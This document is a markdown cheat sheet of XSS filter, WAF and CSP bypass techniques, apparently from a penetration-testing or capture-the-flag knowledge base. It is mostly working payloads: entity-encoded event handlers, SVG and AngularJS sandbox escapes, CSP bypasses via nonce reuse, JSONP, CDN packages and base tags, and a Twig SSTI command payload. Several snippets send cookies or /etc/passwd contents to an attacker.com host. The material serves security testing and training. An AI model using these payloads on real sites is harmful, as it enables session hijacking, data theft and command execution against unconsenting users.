# XSS Bypass Techniques

WAF / filter evasion catalog. Pair with `dom-xss-advanced.md` and `scenarios/dom-vulnerabilities/waf-filter-bypass.md`.

## HTML entity bypass (attribute decoders)

When input is reflected in an HTML attribute that's decoded before JS execution:
```html
<a onclick="var x='USER_INPUT'">Click</a>
```
Payload `&apos;-alert(1)-&apos;` → `<a onclick="var x=''-alert(1)-''">` → executes.

Common entities: `&apos;` `&quot;` `&lt;` `&gt;` `&#x27;` `&#x22;` `&#39;` `&#34;`.

Single-quote attr: `&apos;-alert(1)-&apos;` / `&#x27;...&#x27;` / `&#39;...&#39;`.
Double-quote attr: `&quot;-alert(1)-&quot;` / `&#x22;...&#x22;` / `&#34;...&#34;`.

setAttribute pattern: `http://attacker.com&apos;);alert(1);//` → after decode → `'); alert(1); //`.

## Character set tricks

**Case**: `<ScRiPt>alert(1)</ScRiPt>`, `<SvG OnLoAd=alert(1)>`, `<IFrAmE src="javascript:alert(1)">`.

**Space bypass**: `<img/src=x/onerror=alert(1)>`, `<svg/onload=alert(1)>`, `<img%09src=x%09onerror=alert(1)>`, `<img%0Asrc=x%0Aonerror=alert(1)>`, `<img/**/src=x/**/onerror=alert(1)>`, `<img%00src=x%00onerror=alert(1)>` (limited).

**Quote bypass**: `<img src=x onerror=alert(1)>` (no quotes), `<img src=`x` onerror=`alert(1)`>` (backticks), mix `<img src='x' onerror="alert(1)">`.

**Parentheses bypass**: `onerror=alert;throw 1`, `<svg onload=alert\`1\`>`, `onerror=alert;throw 1337`.

**Semicolon bypass**: `'-alert(1)-'`, `'+alert(1)+'`, `',alert(1)//'`, newline + `alert(1)//`.

## WAF enumeration with Burp Intruder

Phase 1 — allowed tags: position `<§§>`, payload list (script, img, svg, body, iframe, object, embed, animate, animatetransform, video, audio, ...). Status 200 = allowed.

Phase 2 — allowed attrs / events: position `<svg><animatetransform §§=1>`, payload list (onload, onerror, onclick, onbegin, onend, onrepeat, onfocus, ontoggle, ...). Status 200 = allowed.

Phase 3 — combine: e.g. `<svg><animatetransform onbegin=alert(1)>`.

**Tag fragmentation**: `<scr<!---->ipt>alert(1)</scr<!---->ipt>`, multi-line `<scri\npt>...`.

**Polyglot** (works in many contexts): `javascript:/*-/*\`/*\\\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e`.

## SVG-based bypasses

Allowed tags often: `<svg> <animate> <animatetransform> <animatemotion> <set> <image> <foreignobject> <title> <desc> <use>`. SVG events: `onbegin onend onrepeat onload`.

```html
<svg onload=alert(1)>
<svg><animate onbegin=alert(1)>
<svg><animatetransform onbegin=alert(1)>
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>
<svg><foreignobject><body onload=alert(1)></foreignobject></svg>
```

`<animate>` sets attributes dynamically — bypasses static-pattern href filters. Click required to fire.

## AngularJS sandbox escapes

Basic: `{{1+1}}` test, `{{constructor.constructor('alert(1)')()}}`, `{{$on.constructor('alert(1)')()}}`.

**charAt corruption (no strings)**:
```javascript
toString().constructor.prototype.charAt=[].join
[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
Builds `x=alert(1)` from char codes after corrupting `charAt`.

**ng-include same-origin XHR**: when attacker controls HTML in a template context:
```html
<div ng-app ng-include="'/admin/some-endpoint'"></div>
<div ng-app ng-include src="'/accounts/oauth2/provider/callback/?code=ATTACKER_CODE'"></div>
```
Loads URL with victim cookies, response parsed as Angular template (chains into sandbox escape). Works under strict CSP if Angular itself is allowed. Useful when stored HTML injection strips `<script>` but allows directives.

**AngularJS CSP bypass**:
```html
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)' autofocus>#x
```
ng-focus directive isn't blocked by CSP; expression assignment `(z=alert)` bypasses filter; URL `#x` auto-focuses.

## CSP bypass techniques

### Stale / static / cached nonce
Compare nonce across 3+ requests. If identical or cached:
```javascript
fetch('/page').then(r=>r.text()).then(t=>{
  const nonce = t.match(/nonce="([^"]+)"/)[1];
  const s = document.createElement('script');
  s.nonce = nonce; s.textContent = 'alert(document.cookie)';
  document.body.appendChild(s);
});
```

### CSP policy injection
`Content-Security-Policy: ... ; report-uri /csp-report?token=USER`. Inject `;script-src-elem 'unsafe-inline'`. More-specific directive wins. Full URL: `?token=;script-src-elem%20'unsafe-inline'`.

### Dangling markup (form-action missing)
Strict CSP without `form-action`: inject `<button formaction="https://exploit-server.com" formmethod="get">`. Two-stage: stage 1 redirects victim through CSRF endpoint with form action to exploit server (token leaks via GET URL); stage 2 reuses the captured token to perform state-changing POST.

### JSONP callback reflection (cross-origin allow-list OR same-origin iframe)
Cross-origin: CSP `script-src 'self' https://trusted-site.com` → `<script src="https://trusted-site.com/jsonp?callback=alert"></script>`. Same-origin variant (CSP `default-src 'self'` + a `/list`-style loader that injects `<script src="/api/jsonp?callback=<URL_PARAM>">` from `location.search`): inject `<iframe src="/list?callback=...">` with bare statements (NOT IIFE) — see [scenarios/xss/jsonp-callback-iframe-exfil.md](scenarios/xss/jsonp-callback-iframe-exfil.md).

### CDN allowlist + npm packages
CSP `script-src 'self' https://cdn.jsdelivr.net`. Use `csp-bypass` npm package:
```html
<!-- with eval -->
<script src="https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/classic.js"></script>
<br csp="fetch('https://attacker.com?c='+document.cookie)">
<!-- without eval (sval JS interpreter) -->
<script src="https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.js"></script>
<br csp-base64="BASE64_ENCODED_JS_PAYLOAD">
```
Checklist: verify `connect-src` open for fetch; use `sval-classic` if no `unsafe-eval`; base64 the payload; fall back to `document.location` redirect if `connect-src` blocks fetch.

### Base-tag hijack
CSP allows nonce/hash but not `base-uri`: `<base href="https://attacker.com/">` redirects relative script loads.

## Template injection

**JS template literals**: `Hello ${USER_INPUT}` → payload `${alert(1)}`, `${fetch('//attacker.com?c='+document.cookie)}`.

**SSTI (different class but related)** — Jinja2: `{{7*7}}`, `{{config.items()}}`. Twig: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`.

## Alternative event handlers

**Common**: onclick, ondblclick, onmousedown/up/over/move/out/enter/leave.
**Bypass-friendly**: onfocus/onblur/onfocusin/onfocusout, onsubmit/onreset/oninput/onchange/oninvalid/onsearch, onkeypress/down/up, onloadstart/onprogress/oncanplay/onplay/onpause, onanimationstart/end/iteration, ontransitionend/run/start, onwheel/onscroll, ontouchstart/end/move, onbegin/onend/onrepeat (SVG), onresize/onhashchange/onpageshow/onpagehide.

**Auto-fire (no interaction)**: `<body onload>`, `<svg onload>`, `<img src=x onerror>`, `<video src=x onerror>`, `<audio src=x onerror>`, `<input autofocus onfocus>`, `<marquee onstart>`, `<iframe onload>`.

## Custom tag exploitation

```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```
Custom tags aren't in standard blacklists; `tabindex` makes element focusable; `#x` auto-focuses.

## Advanced encoding

**Double encoding**: `<script>` → `%3Cscript%3E` → `%253Cscript%253E` (when app decodes twice).

**Unicode**: `<script>alert(1)</script>`, `<script&#x3E;alert(1)</script>`, overlong UTF-8 `%C0%BC` → `<` (rare).

**Mutation XSS (mXSS)**: browser re-parses sanitized HTML differently than sanitizer expected:
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

## HTML sanitizer entity-bypass via downstream decoding

Sanitizer preserves entities, downstream component decodes:
```
Input:           <img src=x onerror=alert(1)>
Sanitizer:       &lt;img src=x onerror=alert(1)&gt;   (safe)
Downstream:      <img src=x onerror=alert(1)>          (unsafe — re-rendered)
```
Common chains: `sanitize-html` + `node-html-markdown`; DOMPurify + SSR re-parse; any sanitizer + PhantomJS/headless Chrome.

**PhantomJS file:// read via XSS**:
```javascript
var x=new XMLHttpRequest(); x.open('GET','file:///etc/passwd',false); x.send();
new Image().src='http://attacker.com/?data='+btoa(x.responseText);
```

## Markdown `javascript:` URI XSS — backtick `document.write`

Markdown libs without `javascript:` stripping (`react-marked-markdown` ≤1.4.6, older `marked`, `simplemde`) execute on click or auto-render. `(`/`)` break Markdown link grammar — use backticks:
```
[XSS](javascript: document.write`<script>alert(1)</script>`)
```

Cross-origin SSRF chain (admin views markdown rendered from public source):
```python
js = ("<script>"
      "const x=new XMLHttpRequest\\x28\\x29;"
      "x.open\\x28'GET','https://app.local/admin-only/{id}'\\x29;"
      "x.setRequestHeader\\x28'Authorization','Bearer "+jwt+"'\\x29;"
      "x.send\\x28\\x29;"
      "</script>")
title = f"[XSS](javascript: document.write`{js}`)"
```
Defeats localhost-only `RestrictIP=127.0.0.1` because the request fires from the admin's local browser.

## Misc bypasses

**Multiline regex `/m`**: `^[0-9]+$/m.test(input)` only matches a line boundary. Bypass: `123\nalert(1)` (URL-encoded `123%0aalert(1)`).

**Array.includes type confusion**: `if (blacklist.includes(input))` — when `input` is an array, `includes` always false. Send `?param[]=value` (Express parses as array).

**`/proc/PID/root` path padding**: when path is validated by `.slice(0, N)`, pad with symlink chains:
`/proc/self/root/proc/self/root/proc/self/root/etc/passwd`.

## References

- [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [HTML5 Security Cheatsheet](https://html5sec.org/)
- [AngularJS sandbox escapes (PortSwigger research)](https://portswigger.net/research/dom-based-angularjs-sandbox-escapes)
